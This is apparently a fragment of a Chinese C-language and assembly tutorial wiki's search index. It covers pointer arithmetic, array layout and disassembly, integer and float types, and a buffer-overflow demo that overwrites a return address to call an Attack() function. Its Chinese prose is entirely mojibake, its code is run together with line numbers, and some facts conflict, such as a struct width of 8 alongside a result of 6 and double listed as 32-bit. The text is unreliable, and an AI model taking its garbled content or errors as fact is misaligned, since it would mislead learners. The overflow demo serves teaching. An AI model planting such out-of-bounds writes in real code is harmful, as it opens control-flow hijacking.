printf(&quot;%d &quot;,x); return 0;&#125; å°†açš„ç±»å‹short*å»æ‰1ä¸ª*ï¼Œæ˜¯shortï¼Œå®ƒçš„å®½åº¦æ˜¯2 å°†bçš„ç±»å‹short*å»æ‰1ä¸ª*ï¼Œæ˜¯shortï¼Œå®ƒçš„å®½åº¦æ˜¯2 (200-100)/2=50 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tint* a ; int* b ; a = (int*)200; b = (int*)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; å°†açš„ç±»å‹int*å»æ‰1ä¸ª*ï¼Œæ˜¯intï¼Œå®ƒçš„å®½åº¦æ˜¯4 å°†bçš„ç±»å‹int*å»æ‰1ä¸ª*ï¼Œæ˜¯intï¼Œå®ƒçš„å®½åº¦æ˜¯4 (200-100)/4=25 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tchar**** a ; char**** b ; a = (char****)200; b = (char****)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; å°†açš„ç±»å‹char****å»æ‰1ä¸ª*ï¼Œæ˜¯char***ï¼Œå®ƒçš„å®½åº¦æ˜¯4 å°†bçš„ç±»å‹char****å»æ‰1ä¸ª*ï¼Œæ˜¯char***ï¼Œå®ƒçš„å®½åº¦æ˜¯4 (200-100)/4=25 1234567891011121314151617181920212223#include &quot;stdafx.h&quot;struct Point&#123; int x; int y; int z;&#125;;int main()&#123;\tstruct Point* a ; struct Point* b ; a = (struct Point*)100; b = (struct Point*)20; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; å°†açš„ç±»å‹struct Point*å»æ‰1ä¸ª*ï¼Œæ˜¯struct Pointï¼Œå®ƒçš„å®½åº¦æ˜¯8 å°†bçš„ç±»å‹struct Point*å»æ‰1ä¸ª*ï¼Œæ˜¯struct Pointï¼Œå®ƒçš„å®½åº¦æ˜¯8 (100-20)/8ï¼Œè¿ç®—ç»“æœæ˜¯intç±»å‹ï¼Œèˆå»å°æ•°ï¼Œæ‰€ä»¥æ˜¯6 å°ç»“ ä¸¤ä¸ªç±»å‹ç›¸åŒçš„å¸¦*ç±»å‹çš„å˜é‡å¯ä»¥è¿›è¡Œå‡æ³•æ“ä½œ ç›¸å‡çš„ç»“æœè¦é™¤ä»¥å»æ‰ä¸€ä¸ª*çš„æ•°æ®çš„å®½åº¦ æ¯”è¾ƒ å¸¦*çš„å˜é‡ï¼Œå¦‚æœç±»å‹ç›¸åŒï¼Œå¯ä»¥åšå¤§å°çš„æ¯”è¾ƒã€‚ å°±æ˜¯ä¸€ç§æ–°çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªæ”¾äº†200ï¼Œä¸€ä¸ªå­˜äº†100ã€‚200æ¯”100å¤§ï¼Œè¿™é‡Œä¸è¦æƒ³åˆ°ä»€ä¹ˆåœ°å€ï¼Œè¿™ä¸€å°èŠ‚è¯¾ä¸æåœ°å€ã€‚ 123456789101112131415161718192021#include &quot;stdafx.h&quot;int main()&#123;\tchar**** a ; char**** b ; a = (char****)200; b = (char****)100; if(a&gt;b) &#123; printf(&quot;1&quot;); &#125; else &#123; printf(&quot;2&quot;); &#125; return 0;&#125; çœ‹æ±‡ç¼–ï¼Œç¼–è¯‘å™¨ç”¨çš„æ˜¯jbeï¼Œè¯´æ˜æŒ‡é’ˆæ˜¯æ— ç¬¦å·æ•°"},{"title":"æ•°ç»„","path":"/wiki/C/æ•°ç»„.html","content":"å®šä¹‰ æ•°ç»„çš„æœ¬è´¨ï¼šä¸€ç»„ç›¸åŒç±»å‹çš„å˜é‡ï¼Œä¸ºäº†æ–¹ä¾¿è¯»å†™ï¼Œé‡‡ç”¨çš„ä¸€ç§è¡¨ç¤ºå½¢å¼ã€‚ æ•°ç»„å®šä¹‰çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1æ•°æ®ç±»å‹ å˜é‡å[æ•´å‹å¸¸é‡è¡¨è¾¾å¼]; ä¸ºä»€ä¹ˆä¸èƒ½æ˜¯å˜é‡ï¼ŸVC++debugç‰ˆä¸‹ç¼–è¯‘å™¨é»˜è®¤ä¸ºä¸€ä¸ªå‡½æ•°åˆ†é…çš„ç¼“å†²åŒºå¤§å°æ˜¯40hï¼Œæ¯åœ¨å‡½æ•°é‡Œå¤šå£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå°±ä¼šå†40hçš„åŸºç¡€ä¸ŠåŠ ä¸Šå£°æ˜çš„è¿™ä¸ªå˜é‡å¤§å°ã€‚å¦‚æœå£°æ˜æ•°ç»„æ—¶[]é‡Œç”¨çš„æ˜¯å˜é‡ï¼Œå˜é‡çš„è¯æ²¡æ³•ç¡®å®šï¼Œç¼–è¯‘æ—¶å°±ä¼šå‡ºé”™ã€‚å› ä¸ºç¼–è¯‘æ—¶éœ€è¦è½¬æˆæ±‡ç¼–ï¼Œåœ¨æ±‡ç¼–ä»£ç ä¸­éœ€è¦çŸ¥é“åˆ†é…å¤šå¤§çš„ç¼“å†²åŒºç©ºé—´ï¼ˆsub esp xxhï¼‰ï¼Œå¦åˆ™æ²¡æ³•ç¡®å®šæ±‡ç¼–ä»£ç ï¼Œå°±æ›´ä¸è¦è°ˆåç»­ç”Ÿæˆexeäº†ã€‚1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int age[10]; return 0;&#125;C99æ ‡å‡†æ”¯æŒå˜é•¿æ•°ç»„ï¼ˆvariable-length arrayï¼ŒVLAï¼‰ï¼ŒC11æ”¾å¼ƒäº†è¿™ä¸€ç‰¹æ€§ï¼ŒæŠŠVLAè®¾å®šä¸ºå¯é€‰ã€‚ å†…å­˜åˆ†é… æˆå‘˜åœ°å€é«˜ä½ æ™®é€šå˜é‡çš„å†…å­˜å¸ƒå±€æ•°ç»„çš„å†…å­˜å¸ƒå±€æŒ‰å£°æ˜çš„é¡ºåºï¼Œä»é«˜åœ°å€åˆ°ä½åœ°å€ï¼ˆ[ebp-4]-&gt;[ebp-8]-&gt;â€¦ï¼‰ 1234567891011121314151617#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int v_1=1; int v_2=2; int v_3=3; int v_4=4; int v_5=5; int v_6=6; int v_7=7; int v_8=8; int v_9=9; int v_10=10; return 0;&#125; ç¬¬1ä¸ªæˆå‘˜åœ°å€æœ€ä½ï¼Œå…¶ä½™æˆå‘˜åœ°å€ä»ä½åˆ°é«˜ä¾æ¬¡åˆ†é…ã€‚ å…¶å®è¿™æ ·æ’ä¹Ÿèƒ½ç†è§£ï¼Œå› ä¸ºæ•°ç»„ä½¿ç”¨ï¼Œéƒ½ä»ä¸‹æ ‡å°çš„å¼€å§‹ä½¿ç”¨ã€‚ age[0]å¯¹åº”çš„æ˜¯[ebp-28h]ï¼Œage[1]å¯¹åº”çš„æ˜¯[ebp-24h]â€¦ age[0]-&gt;age[1]-&gt;age[2]-&gt;â€¦è¿™æ ·ï¼Œä¹Ÿæ˜¯ä»ä½åœ°å€åˆ°é«˜åœ°å€ 1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int age[10]=&#123;1,2,3,4,5,6,7,8,9,10&#125; return 0;&#125; ç¼–è¯‘å™¨ä¸ºæ•°ç»„åˆ†é…çš„å¤§å° å¦‚æœå®šä¹‰char/short/intç±»å‹çš„æ•°ç»„ï¼ŒESPä¼šå‡å°‘å¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ char x[10]short age[10]1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; char x[10]; return 0;&#125; 4Ch-40h=Chï¼Œ12ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬å£°æ˜çš„æ˜¯10ä¸ªcharç±»å‹ï¼Œä¸ºä»€ä¹ˆåˆ†é…äº†12ä¸ªå­—èŠ‚ï¼Ÿ è¿™æ¶‰åŠæœ¬æœºå°ºå¯¸çš„æ¦‚å¿µï¼Œåœ¨32ä½æœºå™¨ä¸‹ï¼Œå¯¹4å­—èŠ‚çš„æ”¯æŒæœ€å¥½ã€‚10ä¸æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥å¤šåˆ†é…äº†2å­—èŠ‚ï¼Œå‡‘æˆ12å­—èŠ‚ï¼Œè¿™æ˜¯ä¸€ç§ä»¥ç©ºé—´æ¢æ—¶é—´çš„åšæ³•ï¼Œåœ¨è¿è¡Œæ•ˆç‡å’Œå†…å­˜åˆ†é…ä¹‹é—´åšçš„å–èˆã€‚1234567#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; short x[10]; return 0;&#125; 54h-40h=14h=20Dï¼Œ20ä¸ªå­—èŠ‚ã€‚å£°æ˜äº†10ä¸ªshortç±»å‹ï¼Œ10Ã—2=20å­—èŠ‚ï¼Œåˆšå¥½æ˜¯4å­—èŠ‚çš„å€æ•°ã€‚ å…¶å®ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå¦‚æœè¿˜æ˜¯åƒå‚æ•°å’Œå±€éƒ¨å˜é‡é‚£æ ·ï¼Œæ¯ä¸ªcharå’Œshortç±»å‹çš„å˜é‡éƒ½ç»™4å­—èŠ‚ï¼Œå½“1ä¸ªæ•°ç»„éå¸¸å¤§æ—¶ï¼Œç©ºé—´æµªè´¹å°±å¾ˆå¤§ã€‚æ‰€ä»¥æ•°ç»„ä¸‹çš„charå’Œshortç±»å‹å¹¶æ²¡æœ‰åƒå‚æ•°å’Œå±€éƒ¨å˜é‡é‚£æ ·æ¯ä¸ªåˆ†é…4å­—èŠ‚ã€‚ ç»“è®ºï¼šæ ¹æ®å£°æ˜çš„æ€»å¤§å°ï¼ŒæŒ‰4å­—èŠ‚çš„å€æ•°è¿›è¡Œåˆ†é…ã€‚ æ•°ç»„çš„è®¿é—® æ— è®ºå¤šä¹ˆå¤æ‚çš„è¡¨è¾¾å¼ï¼Œåœ¨æˆ‘ä»¬çœ¼ä¸­å°±æ˜¯ä¸€ä¸ªå€¼ã€‚ä¸‹é¢å½¢å¼å¯¹æ•°ç»„çš„è®¿é—®éƒ½æ˜¯å¯ä»¥çš„ï¼š 123456789101112131415161718192021222324252627282930#include &quot;stdafx.h&quot;int Add(int x,int y)&#123; return x+y;&#125;void Function() &#123; int arr[10] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; int x = 1; int y = 2; int r ; r = arr[1]; r = arr[x]; r = arr[x+y]; r = arr[x*2+y]; r = arr[arr[1]+arr[2]]; r = arr[Add(1,2)]; &#125; int main(int argc, char *argv[])&#123; Function(); return 0;&#125; ç»ƒä¹ ï¼šæ‰¾å‡ºä¸Šé¢ä»£ç ä¸­å¯¹å˜é‡rèµ‹å€¼è¿‡ç¨‹çš„åæ±‡ç¼–ä»£ç ã€‚ç›®çš„ï¼šå¼„æ¸…æ•°ç»„åœ¨å†…å­˜ä¸­çš„å¯»å€æ–¹å¼ ç­”æ¡ˆ1234567891011121314151617181920212223242526Function:0040DE60 55 push ebp0040DE61 8B EC mov ebp,esp0040DE63 83 EC 74 sub esp,74h0040DE66 53 push ebx0040DE67 56 push esi0040DE68 57 push edi0040DE69 8D 7D 8C lea edi,[ebp-74h]0040DE6C B9 1D 00 00 00 mov ecx,1Dh0040DE71 B8 CC CC CC CC mov eax,0CCCCCCCCh0040DE76 F3 AB rep stos dword ptr [edi]; int arr[10] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;\t0040DE78 C7 45 D8 01 00 00 00 mov dword ptr [ebp-28h],1 ;arr[0]0040DE7F C7 45 DC 02 00 00 00 mov dword ptr [ebp-24h],2 ;arr[1]0040DE86 C7 45 E0 03 00 00 00 mov dword ptr [ebp-20h],3 ;arr[2]0040DE8D C7 45 E4 04 00 00 00 mov dword ptr [ebp-1Ch],4 ;arr[3]0040DE94 C7 45 E8 05 00 00 00 mov dword ptr [ebp-18h],5 ;arr[4]0040DE9B C7 45 EC 06 00 00 00 mov dword ptr [ebp-14h],6 ;arr[5]0040DEA2 C7 45 F0 07 00 00 00 mov dword ptr [ebp-10h],7 ;arr[6]0040DEA9 C7 45 F4 08 00 00 00 mov dword ptr [ebp-0Ch],8 ;arr[7]0040DEB0 C7 45 F8 09 00 00 00 mov dword ptr [ebp-8],9 ;arr[8]0040DEB7 C7 45 FC 0A 00 00 00 mov dword ptr [ebp-4],0Ah ;arr[9]; int x=1; 0040DEBE C7 45 D4 01 00 00 00 mov dword ptr [ebp-2Ch],1; int y=2;0040DEC5 C7 45 D0 02 00 00 00 mov dword ptr [ebp-30h],212345; int r;; r=arr[1];0040DECC 8B 45 DC mov eax,dword ptr [ebp-24h]0040DECF 89 45 CC mov dword ptr [ebp-34h],eaxecx=1ï¼Œ[ebp+ecx*4-28h]=[ebp+0xC-28h]=[ebp+0xC-28h]=[ebp-28h]=1intç±»å‹ï¼Œæ‰€ä»¥æ˜¯Ã—4ã€‚å¦‚æœæ˜¯shortç±»å‹ï¼ŒÃ—2ã€‚å¦‚æœæ˜¯charç±»å‹ï¼ŒÃ—1ã€‚1234; r=arr[x];0040DED2 8B 4D D4 mov ecx,dword ptr [ebp-2Ch]0040DED5 8B 54 8D D8 mov edx,dword ptr [ebp+ecx*4-28h]0040DED9 89 55 CC mov dword ptr [ebp-34h],edx12345; r=arr[x+y];0040DEDC 8B 45 D4 mov eax,dword ptr [ebp-2Ch]0040DEDF 03 45 D0 add eax,dword ptr [ebp-30h]0040DEE2 8B 4C 85 D8 mov ecx,dword ptr [ebp+eax*4-28h]0040DEE6 89 4D CC mov dword ptr [ebp-34h],ecx123456; r=arr[2*x+y];0040DEE9 8B 55 D4 mov edx,dword ptr [ebp-2Ch]0040DEEC 8B 45 D0 mov eax,dword ptr [ebp-30h]0040DEEF 8D 0C 50 lea ecx,[eax+edx*2]0040DEF2 8B 54 8D D8 mov edx,dword ptr [ebp+ecx*4-28h]0040DEF6 89 55 CC mov dword ptr [ebp-34h],edx12345; r=arr[arr[1]+arr[2]]; 0040DEF9 8B 45 DC mov eax,dword ptr [ebp-24h]0040DEFC 03 45 E0 add eax,dword ptr [ebp-20h]0040DEFF 8B 4C 85 D8 mov ecx,dword ptr [ebp+eax*4-28h]0040DF03 89 4D CC mov dword ptr [ebp-34h],ecx1234567;; r=arr[Add(1,2)]; 0040DF06 6A 02 push 20040DF08 6A 01 push 10040DF0A E8 19 31 FF FF call @ILT+35(func) (00401028)0040DF0F 83 C4 08 add esp,80040DF12 8B 54 85 D8 mov edx,dword ptr [ebp+eax*4-28h]0040DF16 89 55 CC mov dword ptr [ebp-34h],edx æ•°ç»„è¾¹ç•Œ ç¼–è¯‘å™¨ä¸ä¼šæ£€æŸ¥æ•°ç»„è¾¹ç•Œã€‚ç¼–è¯‘ä¸ä¼šæœ‰é”™ï¼Œä½†è¯»å–çš„æ•°æ®ä¸å¯æ§ã€‚ ç¼“å†²åŒºæº¢å‡º ä¸‹é¢ä»£ç çš„Attack()ä¸ºä»€ä¹ˆä¼šè¢«è°ƒç”¨ï¼Ÿ 123456789101112131415161718192021#include &quot;stdafx.h&quot;void Attack() &#123; printf(&quot;Attack!&quot;); getchar(); &#125; void Fun() &#123; int arr[5] = &#123;1,2,3,4,5&#125;; arr[6] = (int)Attack; &#125; int main(int argc, char *argv[])&#123; Fun(); return 0;&#125; ç­”æ¡ˆä¸‹é¢è¿™è¡Œä»£ç çš„è§£é‡Šï¼šå‡½æ•°åå’Œå˜é‡åéƒ½æ˜¯å†…å­˜åœ°å€çš„åˆ«åã€‚ä¸‹é¢è¿™è¡Œå°±æ˜¯å°†Attackå‡½æ•°çš„åœ°å€è½¬ä¸ºintç±»å‹åèµ‹å€¼ç»™å˜é‡arr[6]ã€‚1arr[6] = (int)Attack;\tæ•°ç»„æ­£å¸¸è¾¹ç•Œæ˜¯arr[0]-arr[4]ï¼Œç”¨arr[6]ä¿®æ”¹äº†[ebp+4]ï¼ˆè¿”å›åœ°å€ï¼‰ã€‚æ‰€ä»¥ï¼ŒFunç»“æŸè°ƒç”¨è¿”å›æ—¶ï¼Œè¿”å›åˆ°äº†Attackå‡½æ•°ã€‚"},{"title":"æ•´æ•°ç±»å‹å’Œæµ®ç‚¹ç±»å‹","path":"/wiki/C/æ•´æ•°ç±»å‹å’Œæµ®ç‚¹ç±»å‹.html","content":"æ•°æ®ç±»å‹ Cè¯­è¨€ä¸­çš„æ•°æ®ç±»å‹å¯åˆ†ä¸ºï¼šåŸºæœ¬ç±»å‹ï¼ˆæ•´æ•°ç±»å‹ï¼Œæµ®ç‚¹ç±»å‹ï¼‰ã€æ„é€ ç±»å‹ï¼ˆæ•°ç»„ç±»å‹ï¼Œç»“æ„ä½“ç±»å‹ï¼Œå…±ç”¨ä½“è”åˆç±»å‹ï¼‰ã€æŒ‡é’ˆç±»å‹ã€ç©ºç±»å‹ï¼ˆvoidï¼‰ã€‚ æœ¬èŠ‚æˆ‘ä»¬è®²è§£åŸºæœ¬ç±»å‹ã€‚ å¦‚ä½•å­¦ä¹ æ•°æ®ç±»å‹ ä»ä¸‰ä¸ªæ–¹é¢å¯¹æ•°æ®ç±»å‹è¿›è¡Œå­¦ä¹ ï¼š å­˜å‚¨æ•°æ®çš„å®½åº¦ å­˜å‚¨æ•°æ®çš„æ ¼å¼ å­˜å‚¨åœ¨è®¡ç®—æœºä¸­åŒä¸€ä¸ªæ•°ï¼Œä¸åŒçš„è§£é‡Šï¼Œå¾—åˆ°çš„å€¼ä¸ä¸€æ ·ã€‚ ä½œç”¨èŒƒå›´ï¼ˆä½œç”¨åŸŸï¼‰ æ•´æ•°ç±»å‹ å®½åº¦ å˜é‡ç±»å‹ ä½æ•° æ•°æ®å®½åº¦ æ•°æ®èŒƒå›´ char 8bit 1å­—èŠ‚ 0-0xFF short 16bit 2å­—èŠ‚ 0-0xFFFF int 32bit 4å­—èŠ‚ 0-0xFFFFFFFF long 32bit 4å­—èŠ‚ 0-0xFFFFFFFF åœ¨16ä½è®¡ç®—æœºä¸­ï¼Œintå’Œshortå®½åº¦ä¸€æ ·ï¼Œéƒ½æ˜¯16ä½ï¼› åœ¨32ä½è®¡ç®—æœºä¸­ï¼Œintå’Œlongå®½åº¦ä¸€æ ·ï¼Œéƒ½æ˜¯32ä½ã€‚ åœ¨æ•°æ®æº¢å‡ºæ—¶èˆå¼ƒé«˜ä½ï¼Œä¿ç•™ä½ä½ 12char x=0xFF //1111 1111char y=0x110 //0001 0001 0000 å­˜å‚¨æ ¼å¼ åŸç ï¼Œåç ï¼Œè¡¥ç ï¼Œå‚è€ƒæ•°æ®çš„è¿ç®—å’Œè¡¨ç¤º-æ•°çš„è¡¨ç¤ºã€‚ æœ‰ç¬¦å·å’Œæ— ç¬¦å· signedã€unsigned åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å®Œå…¨ä¸€æ ·ã€‚ æœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°åœ¨ä»¥ä¸‹å¸¸è§ä¼šæœ‰åŒºåˆ«ï¼ˆæµ·å“¥çš„æ€»ç»“ï¼‰ï¼š æ‹“å±•ï¼ˆé«˜ä½è¡¥0è¿˜æ˜¯è¡¥1ï¼‰ æ¯”è¾ƒï¼ˆåŒä¸€ä¸ªæ•°ï¼Œè§£é‡Šä¸ºæ­£æ•°æˆ–è´Ÿæ•°ï¼Œå¤§å°æ˜¯ä¸ä¸€æ ·çš„ï¼‰ è¿˜æ˜¯é‚£å¥è¯ï¼Œå–å†³äºç¨‹åºå‘˜å¯¹å¾…è¿™ä¸ªæ•°æ®çš„è§†è§’ï¼Œè½åœ¨ç¼–ç¨‹ä¸Šï¼Œå°±æ˜¯å˜é‡ç±»å‹å£°æ˜ï¼Œå’Œæ€ä¹ˆå»ä½¿ç”¨è¿™ä¸ªå˜é‡ã€‚ æµ®ç‚¹æ•°ç±»å‹ å®½åº¦ å˜é‡ç±»å‹ ä½æ•° æ•°æ®å®½åº¦ float 32bit 4å­—èŠ‚ double 32bit 8å­—èŠ‚ long double 32bit 8å­—èŠ‚ï¼ˆæŸäº›å¹³å°çš„ç¼–è¯‘å™¨å¯èƒ½æ˜¯16ä¸ªå­—èŠ‚ï¼‰ å»ºè®®çš„èµ‹å€¼æ–¹å¼ï¼š 123float a = 1.23F;double b = 2.34;long double c = 2.34L; å¦‚æœä¸åŠ ä¸ŠFï¼Œç¼–è¯‘å™¨é»˜è®¤ä¼šè®¤ä¸ºè¿™ä¸ªå€¼æ˜¯doubleï¼Œç„¶åå†è½¬æ¢èµ‹å€¼ç»™floatã€‚ å­˜å‚¨æ ¼å¼ éµå®ˆIEEEç¼–ç æ ‡å‡†ã€‚ ä»¥floatç±»å‹ä¸ºä¾‹ï¼Œå°†ä¸€ä¸ªæµ®ç‚¹æ•°è½¬åŒ–ä¸ºå†…å­˜å­˜å‚¨æ ¼å¼çš„æ­¥éª¤ä¸ºï¼š å°†è¿™ä¸ªå®æ•°çš„ç»å¯¹å€¼è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼ï¼ˆè¾—è½¬ç›¸é™¤æ³•ï¼‰ æ•´æ•°éƒ¨åˆ†ï¼Œä¸æ–­é™¤ä»¥2ï¼Œç›´åˆ°ç»“æœä¸º0ã€‚ç»“æœä»ä¸‹å¾€ä¸Šè¯»ã€‚ å°æ•°éƒ¨åˆ†ï¼Œä¸æ–­ä¹˜ä»¥2ï¼›å¦‚æœç»“æœå¤§äº1.0åˆ™äºŒè¿›åˆ¶ä½ä¸º1ï¼Œå¦åˆ™ä¸º0ï¼›ç›´åˆ°ç»“æœçš„å°æ•°ç‚¹ä¸º0æˆ–è¿›å…¥å¾ªç¯ã€‚ç»“æœä»ä¸Šå¾€ä¸‹è¯»ã€‚ å°†è¿™ä¸ªäºŒè¿›åˆ¶æ ¼å¼å®æ•°çš„å°æ•°ç‚¹å·¦ç§»æˆ–å³ç§»nä½ï¼Œç›´åˆ°å°æ•°ç‚¹ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªæœ‰æ•ˆæ•°å­—çš„å³è¾¹ã€‚ ä»å°æ•°ç‚¹å³è¾¹ç¬¬ä¸€ä½å¼€å§‹å–å‡ºäºŒåä¸‰ä½æ•°å­—æ”¾å…¥ç¬¬22åˆ°ç¬¬0ä½ã€‚ æœ‰çš„å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶éƒ¨åˆ†æ˜¯ä¸ªå¾ªç¯ã€‚IEEEæ ‡å‡†ä¸‹å°¾æ•°å°±æ˜¯23ä½ã€‚ æœ‰çš„å°æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶éƒ¨åˆ†ä¸ä¼šå¾ªç¯ï¼Œä¸å¤Ÿ23ä¸ªï¼Œåé¢å°±è¡¥0ã€‚ å¡«å……ç¬¦å·ä½ï¼ˆç¬¬31ä½ï¼‰ã€‚ å¦‚æœå®æ•°æ˜¯æ­£çš„ï¼Œåˆ™æ”¾å…¥â€œ0â€ å¦‚æœå®æ•°æ˜¯è´Ÿçš„ï¼Œåˆ™æ”¾å…¥â€œ1â€ã€‚ æŒ‡æ•°éƒ¨åˆ† å¦‚æœnæ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œè¯´æ˜æŒ‡æ•°æ˜¯æ­£çš„ã€‚é‚£ä¹ˆç¬¬30ä½æ”¾å…¥â€œ1â€ï¼Œå…¶ä½™å¾…å®šä¸º0ï¼ŒæŒ‡æ•°éƒ¨åˆ†æ­¤æ—¶å˜æˆ10000000ã€‚éšåå°†nå‡å»1ï¼Œè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ï¼ˆ7ä¸ªé›¶ï¼Œ0000000ï¼‰ï¼ˆç¬¬30ä½ä¸åŠ¨ï¼‰ã€‚ å¦‚æœnæ˜¯å³ç§»å¾—åˆ°çš„æˆ–n=0ï¼Œåˆ™ç¬¬30ä½æ”¾å…¥â€œ0â€ï¼Œå…¶ä½™å¾…å®šä¸º0ï¼ŒæŒ‡æ•°éƒ¨åˆ†æ­¤æ—¶å˜æˆ00000000ã€‚ éšåå°†nå‡å»1ï¼Œè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ï¼ˆ7ä¸ªé›¶ï¼Œ0000000ï¼‰ï¼ˆç¬¬30ä½ä¸åŠ¨ï¼‰ã€‚ æˆ– å°†nè½¬æ¢ä¸ºäºŒè¿›åˆ¶ååœ¨å·¦è¾¹åŠ â€œ0â€è¡¥è¶³7ä½ï¼Œå†å„ä½æ±‚åï¼Œæ”¾å…¥ç¬¬29ä½åˆ°23ä½ã€‚ ä¼ ç»Ÿè®¡ç®—æ–¹å¼è¿™é‡Œæ˜¯n+åç½®å€¼127ï¼ˆå…¶å®å°±æ˜¯ç§»ç ï¼‰ï¼Œç„¶åè½¬äºŒè¿›åˆ¶ï¼Œæ”¾å…¥æŒ‡æ•°éƒ¨åˆ†ã€‚ æµ·å“¥è¿™é‡Œå¯¹æŒ‡æ•°éƒ¨åˆ†å¤„ç†è¿›è¡Œäº†ä¼˜åŒ–ï¼š å¯¹äºnä¸ºæ­£çš„æƒ…å†µï¼š10000000ï¼Œç›¸å½“äº+äº†128ï¼ŒåŠ å¤šäº†ä¸ª1ã€‚ç„¶ån-1ï¼Œè½¬äºŒè¿›åˆ¶ï¼Œæ”¾å…¥æŒ‡æ•°éƒ¨åˆ†å7ä½ã€‚ å¯¹äºnä¸ºè´Ÿçš„æƒ…å†µï¼š å‡è®¾n=-3 ä¼ ç»Ÿç®—æ³•ï¼š127+(-3)=124ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶æ•°01111100 æµ·å“¥çš„ç®—æ³•ï¼š00000000ï¼Œ-3-1=-4ï¼ŒFCï¼Œ1111 1100ï¼Œæ”¾å…¥ï¼ˆç›¸å½“äº+10000000ï¼Œå³+128ï¼Œè¿›ä½ä¸¢å¤±ï¼›æˆ–å«èˆæ‰æœ€é«˜ä½ï¼‰ï¼Œå¾—åˆ°0 111 1100 åœ¨æœ¬æ¥è´Ÿæ•°æœ€é«˜ä½ä¸º1çš„æƒ…å†µä¸‹ï¼Œ10000000å˜æˆ00000000ï¼Œç›¸å½“äº+æ­£æ•°128ï¼ŒåŠ å¤šäº†ä¸ª1ã€‚ç„¶ån-1ï¼Œè½¬äºŒè¿›åˆ¶ï¼Œæ”¾å…¥æŒ‡æ•°éƒ¨åˆ†å7ä½ã€‚ ä¾‹1-1 8.25è½¬æˆæµ®ç‚¹å­˜å‚¨ æ­¥éª¤ä¸€ å°†å®æ•°éƒ¨åˆ†è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼ ä»ä¸‹å¾€ä¸Šè¯»ï¼Œç”±æ­¤å¯ä»¥å¾—å‡º8çš„äºŒè¿›åˆ¶ä¸º1000 æ‰€æœ‰çš„æ•´æ•°ä¸€å®šå¯ä»¥å®Œæ•´çš„è½¬æ¢ä¸ºäºŒè¿›åˆ¶ã€‚ ä»ä¸Šå¾€ä¸‹è¯»ï¼Œå°æ•°éƒ¨åˆ†0.25ä¸æ–­çš„ä¹˜ä»¥2ï¼Œç›´åˆ°ç»“æœå°æ•°ç‚¹ä¸º0ã€‚ ç”¨äºŒè¿›åˆ¶æè¿°å°æ•°ï¼Œä¸å¯èƒ½åšåˆ°å®Œå…¨ç²¾ç¡®ã€‚æ¯”å¦‚å°†0.4è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œä¸æ–­Ã—2ä¼šè¿›å…¥å¾ªç¯ï¼Œæ°¸è¿œæ— æ³•å¾—åˆ°ç»“æœå°æ•°ç‚¹ä¸º0çš„æƒ…å†µã€‚ å¾—åˆ°8.25çš„äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ 1000.01 æ­¥éª¤äºŒ äºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³• 1000.01-&gt;1.00001Ã—2çš„3æ¬¡æ–¹ï¼Œn=3 æ­¥éª¤ä¸‰ å¡«å……å°¾éƒ¨éƒ¨åˆ† ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 00001000000000000000000 æ­¥éª¤å›› å¡«å……ç¬¦å·ä½ 8.25æ˜¯æ­£æ•°ï¼Œç¬¦å·ä½ä¸º0 ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 00001000000000000000000 æ­¥éª¤äº” å¤„ç†æŒ‡æ•°éƒ¨åˆ† næ˜¯å·¦ç§»å¾—åˆ°çš„ï¼Œç¬¬30ä½æ”¾å…¥â€œ1â€ï¼Œå…¶ä½™è¡¥0ï¼ŒæŒ‡æ•°éƒ¨åˆ†æ­¤æ—¶å˜æˆ10000000ã€‚ ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 10000000 00001000000000000000000 å°†nå‡å»1ï¼Œè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œæ”¾å…¥ç¬¬29åˆ°ç¬¬23ä½ï¼ˆ7ä¸ªé›¶ï¼Œ0000000ï¼‰ 3-1=2ï¼ŒäºŒè¿›åˆ¶æ•°æ˜¯10ã€‚æ”¾å…¥æŒ‡æ•°éƒ¨åˆ†ç¬¬29åˆ°ç¬¬23ä½ï¼Œå¾—åˆ° ç¬¦å·ä½ æŒ‡æ•°éƒ¨åˆ† å°¾æ•°éƒ¨åˆ† 0 10000010 00001000000000000000000 0100 0001 0000 0100 0000 0000 0000 0000 åå…­è¿›åˆ¶å°±æ˜¯ï¼š41040000h ä¾‹1-2 -8.25è½¬æˆæµ®ç‚¹å­˜å‚¨ 